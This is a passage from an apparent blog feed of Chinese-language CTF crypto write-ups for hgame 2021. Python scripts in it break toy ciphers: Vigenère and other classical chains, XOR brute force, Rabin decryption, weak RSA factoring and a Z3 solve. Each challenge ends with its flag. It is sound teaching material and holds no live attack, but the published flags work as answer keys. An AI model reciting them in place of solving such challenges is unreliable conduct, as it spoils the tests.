8250074060227424392167527480278910311544463644939163863769800244251691098015162856236070604894987171336652702639307688862569950283687840934874010961725585832492731862924434685764812548041942932991437304133383574739841020490451401245854993454773753547866987060882966503717524737256677223747928372221303252718695826435001757305710227632289961692972038030904412656632501968027338817269883309383732475572755488896637328455512190203818917772932072670066152200777928816271099465751840664067526661763508166046612541288397476570710909799201617460030087141733073112323853659638000871425108472297885477189405403650284325277579</span><br><span class="line">n&#x3D; 16949347684624444199730882020549727207579797835364486390222263981799637446520951564941479241788730755429607052441560089686202304965202328865879149004045368822166561031121061030823165425477649845937992280653629411960834585264656371767877344497402099272681450025479203969037271341644808077619919300874706124928010632466743721206172988706126276081105311610156444961489929845956521779517683260317442382177867528340690129611191602929151767062963900466581680747022376748730840902068954788887770543814815800099455381548242834877925303848347612497301376626619324115990787052927789981745597417645251872764332317707438924093033</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure><h2 id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span>(<span class="params">n, e, d</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">k = e * d - <span class="number">1</span></span><br><span class="line">g = randint(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">while</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">k = k // <span class="number">2</span></span><br><span class="line">temp = <span class="built_in">pow</span>(g, k, n) - <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> GCD(temp, n) &gt; <span class="number">1</span> <span class="keyword">and</span> temp != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> GCD(temp, n)</span><br><span class="line">d1= <span class="number">9760674595501947732457134417772666654580910784816074596844201976549126705054354532744195920843927665908857588327157473562216170891125640382183269947688729492002810318988357177843006032057493977990230963641128334174799854776285092800882842648831234701775647426821652455794980815493792844613781136370482076703203544329344257671121278311220536853628753281655611599927657825576986012274045522950871733649701341830267140818846021723900182040299335787072434827472099558123219735224115651119369318334014106111016265076954167859616248128341257846831841124963643146233831386180209364959204819225771569971911306452163266250257</span></span><br><span class="line">e1= <span class="number">65537</span></span><br><span class="line">c1= <span class="number">3031544832428623963829906203623666284826018126199675444023110501554085620562976921090566814311982177229076467389126296690887508093409644544972677863798265638151530384969210400494640484499273950795927369791039457791939011939112692503358690615659156690833216424157047559547652680167891276098046663088364517155401153590589041194382962115823941265534326403568233361880237227171213594784532894464467801044463414691777180394710594840327220694687433155323278247440513979172779693066168556516883948734483230577736355223376127267320269806380149257745585678220927864789251997620899712591359197840818646408155483090462327378317</span></span><br><span class="line">e2= <span class="number">727</span></span><br><span class="line">c2= <span class="number">8250074060227424392167527480278910311544463644939163863769800244251691098015162856236070604894987171336652702639307688862569950283687840934874010961725585832492731862924434685764812548041942932991437304133383574739841020490451401245854993454773753547866987060882966503717524737256677223747928372221303252718695826435001757305710227632289961692972038030904412656632501968027338817269883309383732475572755488896637328455512190203818917772932072670066152200777928816271099465751840664067526661763508166046612541288397476570710909799201617460030087141733073112323853659638000871425108472297885477189405403650284325277579</span></span><br><span class="line">n= <span class="number">16949347684624444199730882020549727207579797835364486390222263981799637446520951564941479241788730755429607052441560089686202304965202328865879149004045368822166561031121061030823165425477649845937992280653629411960834585264656371767877344497402099272681450025479203969037271341644808077619919300874706124928010632466743721206172988706126276081105311610156444961489929845956521779517683260317442382177867528340690129611191602929151767062963900466581680747022376748730840902068954788887770543814815800099455381548242834877925303848347612497301376626619324115990787052927789981745597417645251872764332317707438924093033</span></span><br><span class="line">p = getpq(n, e1, d1)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, n)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n)</span><br><span class="line">print(n2s(m1)+n2s(m2))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;F4ct0r1n9_N_G1v3n_D&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-AES-With-RSA&quot;&gt;&lt;a href=&quot;#1-AES-With-RSA&quot; class=&quot;headerlink&quot; title=&quot;1.AES With RSA&quot;&gt;&lt;/a&gt;1.AES With RSA&lt;/h1&gt;&lt;h2 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021-hgame-Crypto汇总</title>
    <link href="http://example.com/2021/02/24/2021-hgame-Crypto%E6%B1%87%E6%80%BB/"/>
    <id>http://example.com/2021/02/24/2021-hgame-Crypto%E6%B1%87%E6%80%BB/</id>
    <published>2021-02-24T01:07:46.000Z</published>
    <updated>2021-02-24T08:06:50.889Z</updated>
    
    <content type="html"><![CDATA[<p>-Week1</p><h1 id="1-Transformer"><a href="#1-Transformer" class="headerlink" title="1.Transformer"></a>1.Transformer</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 50 (175 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像</p></blockquote><p><a href="https://uploader.shimo.im/f/Dr6LSkvY2NV5T4QG.zip?attname=Transformer%20(2).zip&download">附件</a></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="setp1："><a href="#setp1：" class="headerlink" title="setp1："></a>setp1：</h3><p><a href="https://www.guballa.de/vigenere-solver">维吉尼亚</a></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031026078.png" alt="image-20210224031026078"></p><p>enc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk &quot;qypth&#123;hp5d_s0n_szi^3ic&amp;qh11a_&#125;&quot;,Dai&#39;o sanyho oa pcc oqh dhpn po oqh hic.</span><br></pre></td></tr></table></figure><h3 id="setp2："><a href="#setp2：" class="headerlink" title="setp2："></a>setp2：</h3><p>指定<a href="https://quipqiup.com/">词频攻击</a></p><p><u>qypth=hgame</u></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031258574.png" alt="image-20210224031258574"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mhe lift bridge console system has only used password login since 2003, the password is &quot;hgame&#123;ea5y_f0r_fun^3nd&amp;he11o_&#125;&quot;,Yon&#39;t forget to add the year at the end.</span><br></pre></td></tr></table></figure><p>最后提示要在flag末尾加年份。</p><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag:"></a>Getflag:</h3><p>故完整的flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;ea5y_f0r_fun^3nd&amp;he11o_2021&#125;</span><br></pre></td></tr></table></figure><h1 id="2-まひと"><a href="#2-まひと" class="headerlink" title="2.まひと"></a>2.まひと</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 50 (135 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p><strong>hint: flag的格式为hgame{xxx}（重要）</strong><br>大家好，我叫真人，来自咒术回战，你也可以叫我，缝合怪！！</p></blockquote><p><a href="https://uploader.shimo.im/f/ftUUxRafZnUpHKdj?attname=cipher%20(4)&download">附件</a></p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="setp1：-1"><a href="#setp1：-1" class="headerlink" title="setp1："></a>setp1：</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031717187.png" alt="image-20210224031717187"></p><p>使用python数据清洗一下。得到一串base64</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031748002.png" alt="image-20210224031748002"></p><p>拿去解码</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031827727.png" alt="image-20210224031827727"></p><h3 id="setp2"><a href="#setp2" class="headerlink" title="setp2:"></a>setp2:</h3><p>提示维吉尼亚，密钥为Liki：</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">解密</a>得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp&#123;rzntu</span><br></pre></td></tr></table></figure><p>翻转：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utnzr&#123;pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!&#125;</span><br></pre></td></tr></table></figure><p><a href="http://www.rot13.de/index.php">rot13</a>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</span><br></pre></td></tr></table></figure><p>Getflag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</span><br></pre></td></tr></table></figure><h1 id="3-对称之美"><a href="#3-对称之美" class="headerlink" title="3.对称之美"></a>3.对称之美</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 150 (82 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>美术大师 Liki 总说，对称是世界上最美的结构…</p></blockquote><p><a href="https://uploader.shimo.im/f/BFfP584qk6NoibMz.py?attname=task%20(4).py&download">附件</a></p><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>约束条件：1：明文为ascii的可见字符，2：明文又 hgame 字符根据上面条件，爆破key即可，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Symmetry in art is when the elements of </span><br><span class="line">a painting or drawing balance each other </span><br><span class="line">out. This could be the objects themselves, </span><br><span class="line">but it can also relate to colors and </span><br><span class="line">other compositional techniques.</span><br><span class="line">You may not realize it, but your brain </span><br><span class="line">is busy working behind the scenes to seek </span><br><span class="line">out symmetry when you look at a painting. </span><br><span class="line">There are several reasons for this. The </span><br><span class="line">first is that we&#39;re hard-wired to look for </span><br><span class="line">it. Our ancient ancestors may not have had </span><br><span class="line">a name for it, but they knew that their </span><br><span class="line">own bodies were basically symmetrical, as </span><br><span class="line">were those of potential predators or prey. </span><br><span class="line">Therefore, this came in handy whether </span><br><span class="line">choosing a mate, catching dinner or </span><br><span class="line">avoiding being on the menu of a snarling, </span><br><span class="line">hungry pack of wolves or bears!</span><br><span class="line">Take a look at your face in the mirror </span><br><span class="line">and imagine a line straight down the </span><br><span class="line">middle. You&#39;ll see both sides of your </span><br><span class="line">face are pretty symmetrical. This is </span><br><span class="line">known as bilateral symmetry and it&#39;s </span><br><span class="line">where both sides either side of this </span><br><span class="line">dividing line appear more or less the same.</span><br><span class="line">So here is the flag: </span><br><span class="line">hgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;</span><br><span class="line"></span><br><span class="line">isN0NCe6yBIPXTcl</span><br></pre></td></tr></table></figure><h2 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag:"></a>Getflag:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;</span><br></pre></td></tr></table></figure><p>-week2</p><h1 id="1-signin"><a href="#1-signin" class="headerlink" title="1.signin"></a>1.signin</h1><h2 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述 签到题 233</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/koY9hA7C3QhHZx18.py?attname=task%20(9).py&download">附件</a></p><p>基准分数 150</p><p>当前分数 150</p><p>完成人数 83</p></blockquote><h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224035200644.png" alt="image-20210224033622881"></p><h3 id="推导"><a href="#推导" class="headerlink" title="推导"></a>推导</h3><p>费马小定理+模运算+模逆运算<br>$$<br>\because a^{p}\equiv a mod p<br>$$</p><p>$$<br>\therefore c\equiv (a^{p}*m) mod p\equiv (ab) modp<br>$$</p><p>$$<br>\therefore m\equiv c*a^{-1} mod p<br>$$</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">d=inverse(a,p)</span><br><span class="line">m=c*d%p</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;hgame&#123;M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Getflag-2"><a href="#Getflag-2" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;M0du1@r_m4th+1s^th3~ba5is-Of&#x3D;cRypt0!!&#125;</span><br></pre></td></tr></table></figure><h1 id="2-gcd-or-more"><a href="#2-gcd-or-more" class="headerlink" title="2.gcd or more?"></a>2.gcd or more?</h1><h2 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>GCD…?</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/RgIgZh0F0O2DDBmO.py?attname=task%20(10).py&download">附件</a></p><p>基准分数 200</p><p>当前分数 200</p><p>完成人数 91</p></blockquote><h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224035200644.png" alt="image-20210224035200644"></p><p>思路：</p><p>看到e=2，且已知p,q猜测 为RSA 的<a href="https://xz.aliyun.com/t/5113">rabin</a>的加密算法</p><h3 id="推导："><a href="#推导：" class="headerlink" title="推导："></a>推导：</h3><h4 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h4><p>选择两个大素数p和q做为私钥</p><p>计算n = p * q做为公钥</p><p>若明文为m，则密文为<br>$$<br>c ≡ m^2 (mod n)<br>$$</p><h4 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h4><p>$$<br>r\equiv \sqrt{c} (mod p)<br>$$</p><p>$$<br>s\equiv \sqrt{c} (mod q)<br>$$</p><p>根据欧拉判别式，满足p为素数，gcd(c,p)=1</p><p>则有<br>$$<br>a^{(p-1)/2}\equiv 1 modp<br>$$</p><p>$$<br>\because r^{2} \equiv cmod p<br>$$</p><p>$$<br>\therefore r^{2}\equiv c  c^{(p-1)/2}modp \equiv c^{(p+1)/2}mod p \equiv (c^{(p+1)/4})^{2}modp<br>$$</p><p>$$<br>\therefore r \equiv (c^{(p+1)/4})modp<br>$$</p><p>$$<br>s \equiv  (c^{(q+1)/4})modq<br>$$</p><p>根据扩展欧几里得算法：<br>$$<br>ap + bq ≡ 1 (mod n)<br>$$</p><p>$$<br>a=p^{-1} (mod q)，b=q^{-1} (mod p)<br>$$</p><p>$$<br>x_{1}=(aps+bqr)mod n<br>$$</p><p>$$<br>x2=n-x_{1}<br>$$</p><p>$$<br>x3=(aps-bqr)mod n<br>$$</p><p>$$<br>x4=n-x_{3}<br>$$</p><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c=<span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c, p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;z\x95\x82\x00R3\x1d\x11\xb3\x02Q\xb8\x1f\xcd\xe0\xd0\xbeC\xc31%\xa8]* \t\xdb\xf1v\x87O\xf9 \x15\xbc\xcc+\xe0\xebf\xc4\xd4k\nJ\xfbN\x03\\\xcc\x7f\x00\xa9\x90\xd8l\xef\x98\xce^\xd3\xbd72&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;;\x0b\xe7ra \x82\x1fXQ/\xa1V.\xb9\x91\xc2\xd1&#123;\x9d\xe4;n\x9f\xbb\xd7\xeb\x15\xa8\xc6b\x1e\xb0d\x04^\x000\x0f\xa8\x9a\xfe\xa4\x05|\x9d\xa4&#125;s\x05z\x94\xe9\x80\xda=97R\x00?6A\xa3&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;\xb5\xa1ir\xb3S\x9f1\x0bS\x81Yu\xfc\x9ab\x81\x15&gt;\xcf\t\xe3\xcb\xc9\xdb\xe1\xc7\x07\x1fMI\xb0o\x0c[\xae\xf8\x98\x93\xcb\xfbT\xa5\xdah&amp;\x8dLc\xa0\x80j-\xd1?0\xca]\xee\xf7\xaa\x7f9X&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;hgame&#123;3xgCd~i5_re4l1y+e@sy^r1ght?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Getflag-3"><a href="#Getflag-3" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3xgCd~i5_re4l1y+e@sy^r1ght?&#125;</span><br></pre></td></tr></table></figure><h1 id="3-WhitegiveRSA"><a href="#3-WhitegiveRSA" class="headerlink" title="3.WhitegiveRSA"></a>3.WhitegiveRSA</h1><p><del>手速快拿了一血hhh</del></p><h2 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>N = 882564595536224140639625987659416029426239230804614613279163<br>e = 65537<br>c = 747831491353896780365654517748216624798517769637260742155527</p><p>题目地址 </p><p><a href="https://www.baidu.com/">https://www.baidu.com</a></p><p>基准分数 150</p><p>当前分数 150</p><p>完成人数 187</p></blockquote><h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 882564595536224140639625987659416029426239230804614613279163</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 747831491353896780365654517748216624798517769637260742155527</span><br></pre></td></tr></table></figure><p>通过<a href="http://www.factordb.com/">在线网站</a>将N分解为p,q，算出欧拉值，求逆元。</p><h3 id="脚本：-1"><a href="#脚本：-1" class="headerlink" title="脚本："></a>脚本：</h3><p>教科书般的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">p=<span class="number">857504083339712752489993810777</span></span><br><span class="line">q=<span class="number">1029224947942998075080348647219</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N=p*q</span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)<span class="comment">#计算欧拉值</span></span><br><span class="line">d=invert(e,phi)<span class="comment">#求逆元</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#hgame&#123;w0w~yOU_kNoW+R5@!&#125;</span></span><br></pre></td></tr></table></figure><p>Getflag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#hgame&#123;w0w~yOU_kNoW+R5@!&#125;</span><br></pre></td></tr></table></figure><h1 id="4-The-Password"><a href="#4-The-Password" class="headerlink" title="4.The Password"></a>4.The Password</h1><h2 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Hint</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/Y1dSX4zx6JTyjGUa.txt?attname=flag.txt&download">附件</a></p><p>基准分数 250</p><p>当前分数 250</p><p>完成人数 40</p></blockquote><h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224035200644.png" alt="image-20210224045847254"></p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>注意位数，利用Z3一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    <span class="comment">#bits = len(bin(x)[2:])</span></span><br><span class="line">    bits=<span class="number">64</span></span><br><span class="line">    res = (x&lt;&lt;n | x&gt;&gt;(bits-n)) % <span class="built_in">pow</span>(<span class="number">2</span>,bits)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ror</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    <span class="comment">#bits = len(bin(x)[2:])</span></span><br><span class="line">    bits=<span class="number">64</span></span><br><span class="line">    res = (x&gt;&gt;n | x&lt;&lt;(bits-n)) % <span class="built_in">pow</span>(<span class="number">2</span>,bits)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s= Solver()</span><br><span class="line">x = BitVec(<span class="string">&#x27;x1&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">n = <span class="number">10750832281632461</span></span><br><span class="line">y = <span class="number">4622436850708129231</span></span><br><span class="line">s.add(y==x^n^ror(x,<span class="number">2</span>)^rol(x,<span class="number">5</span>))</span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    print(s.model())</span><br><span class="line">print(long_to_bytes(<span class="number">28541</span>))</span><br><span class="line"><span class="comment">#hgame&#123;l1ne0r_a1gebr0&amp;is@1mpor10n1^1n$crypto&#125;</span></span><br><span class="line"><span class="comment"># is@1mpo</span></span><br></pre></td></tr></table></figure><p>Getflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;l1ne0r_a1gebr0&amp;is@1mpor10n1^1n$crypto&#125;</span><br></pre></td></tr></table></figure><p>-week3</p><h1 id="1-LikiPrime"><a href="#1-LikiPrime" class="headerlink" title="1.LikiPrime"></a>1.LikiPrime</h1><h2 id="Challenge-7"><a href="#Challenge-7" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Wow! 